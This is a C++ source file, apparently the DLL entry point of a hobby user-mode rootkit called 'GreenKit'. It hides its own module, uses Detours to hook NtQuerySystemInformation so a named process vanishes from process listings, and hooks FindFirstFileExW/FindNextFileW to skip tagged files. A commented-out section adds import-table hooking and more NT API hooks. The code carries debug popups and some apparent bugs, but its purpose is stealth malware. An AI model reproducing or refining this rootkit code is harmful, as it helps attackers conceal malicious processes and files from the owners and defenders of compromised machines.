/*#include "stdafx.h"
#include "windefs.h"
#include "hooking.h"

#include "NtQuerySystemInformation.h"
#include "NtEnumerateKey.h"
#include "FindFiles.h"*/

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <windows.h>
#include "Detours.h"
#include "el_win_structs.h"

#include <shlwapi.h>
#include <winsock2.h>

#define REGKEY "SOFTWARE\\example\\example"
#define REGKEY_VALUE "explorer"
#define FILE_TAG "EXAMPLE"

typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

elNtQuerySystemInformation oldNtQuery;
elNtQuerySystemInformation hookNtQuery;

typedef HANDLE(WINAPI *FFFEx)(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

FFFEx oldFFFEx;
FFFEx hookFFFEx;

typedef BOOL(WINAPI *FNFW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);

FNFW oldFNFW;
FNFW hookFNFW;

/*typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NTSTATUS NTAPI NewNtEnumerateKey(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
    OUT PHANDLE  KeyHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes
    );

TD_NtEnumerateKey oldNtEnumerateKey;
TD_NtEnumerateKey hookNtEnumerateKey;*/

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    PELPEB peb = EL_GetPeb();
    EL_HideModule(peb, L"GreenKit.dll");
    HMODULE NtDll = LoadLibrary("ntdll.dll");
    HMODULE Kernel32 = LoadLibrary("kernel32.dll");

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
        oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
        hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);

        oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
        hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);

        oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
        hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);

        //oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
        //hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    
    //MessageBox(0, "LISTING PROCESS CALLED", "HookTest", MB_OK | MB_ICONERROR);
    PELSYSTEM_PROCESS_INFORMATION cur, prev;
    char tmp[128];

    DWORD r = hookNtQuery(i, SystemInformation, SystemInformationLength, ReturnLength);

    if (i == SystemProcessInformation)
    {
        if (r == 0)
        {
            HKEY key;
            DWORD size;
            char exe[128];
            RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);

            RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);

            RegCloseKey(key);

            cur = prev = (PELSYSTEM_PROCESS_INFORMATION)SystemInformation;

            while (1)
            {
                WideCharToMultiByte(CP_ACP, 0, cur->ProcessName.Buffer, -1, tmp, 128, NULL, NULL);

                if (strcmp(tmp, "explorer.exe") == 0)
                {
                    if (cur->NextEntryOffset == 0)
                    {
                        prev->NextEntryOffset = 0;
                        break;
                    }
                    else
                    {
                        prev->NextEntryOffset += cur->NextEntryOffset;
                        cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);
                    }
                }

                if (cur->NextEntryOffset == 0)
                    break;

                prev = cur;
                cur = (PELSYSTEM_PROCESS_INFORMATION)((DWORD)cur + cur->NextEntryOffset);

            }
        }
    }

    return 0;
}

HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
{
    HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
    MessageBox(0, "EXPLORER HOOKED", "HookTest", MB_OK | MB_ICONERROR);
    if (ret)
    {
        WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;

        HANDLE std = GetStdHandle(STD_OUTPUT_HANDLE);

        char name[512];

        WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);

        char exe[128];

        HKEY key;
        DWORD size;

        RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);

        RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);

        RegCloseKey(key);

        if (strstr(name, FILE_TAG) != 0)
        {
            hookFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
        }
    }

    return ret;
}

void path_strip_filename2(TCHAR *Path) {
    size_t Len = _tcslen(Path);
    if (Len == 0) { return; };
    size_t Idx = Len - 1;
    while (TRUE) {
        TCHAR Chr = Path[Idx];
        if (Chr == TEXT('\\') || Chr == TEXT('/')) {
            if (Idx == 0 || Path[Idx - 1] == ':') { Idx++; };
            break;
        }
        else if (Chr == TEXT(':')) {
            Idx++; break;
        }
        else {
            if (Idx == 0) { break; }
            else { Idx--; };
        };
    };
    Path[Idx] = TEXT('\0');
};

BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata)
{
    //BOOL ret = hookFNFW(findfile, finddata);
    /*
    if (ret)
    {
        WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;

        char name[512] = "";

        WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
        
        char exe[128] = "";

        HKEY key;
        DWORD size;

        RegOpenKey(HKEY_LOCAL_MACHINE, REGKEY, &key);

        RegQueryValueEx(key, REGKEY_VALUE, NULL, NULL, (BYTE *)exe, &size);

        RegCloseKey(key);

        if (strcmp(name, "EXAMPLE.txt") == 0 || isPartOf(name, "a"))
        {
            MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
            hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
        }
    }

    return ret;
    */
    //MessageBox(0, "HOOKED FW", "HookTest", MB_OK | MB_ICONERROR);
    WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)finddata;

    char name[512] = "";

    WideCharToMultiByte(CP_ACP, 0, f->cFileName, -1, name, 512, NULL, NULL);
    char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, finddata->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
    path_strip_filename2(szFileName);
    memcpy(szBuffer, szFileName, 6);
    BOOL ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
    if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
    {
        MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
        ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
    }
    return ret;
}

// OLD
/*
VOID WriteFile()
{
    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    DWORD dwBytesWritten = 0;
    char Str[] = "Coucou";
    WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
}

BOOL mustHideFile(TCHAR filePath) {
    return FALSE; // TODO check la fin de la string avec des constantes
}

NTSTATUS WINAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    WriteFile();
    //if (!mustHideFile(*sPath))
    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    return 0;//status; // STATUS_NO_SUCH_FILE
}

NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
{
    //TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    //if (!mustHideFile(*sPath))
    NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength);

    return status; // STATUS_NO_SUCH_FILE
}

void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
{
#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
    DWORD dwOldProtect, dwOldProtect2;
    HMODULE hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNTHeader;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    void *pOldFunction;
    if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
    while (pImportDesc->Name)
    {
        char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
        if (!stricmp(szModuleName, szDllName)) break;
        pImportDesc++;
    }
    if (pImportDesc->Name == NULL) return (NULL);
    pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
    while (pThunk->u1.Function)
    {
        if (pThunk->u1.Function == (DWORD)pOldFunction)
        {
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            pThunk->u1.Function = (DWORD)pNewFunction;
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
            return (pOldFunction);
        }
        pThunk++;
    }
    return (NULL);
}

bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
            MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
			hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
			hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
			hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
            hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
            hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindNextFileA", MyFindNextFileA));
            hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileW", MyFindFirstFileW));
            hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindNextFileW", MyFindNextFileW));
			return TRUE;
	}
	return TRUE;
}*/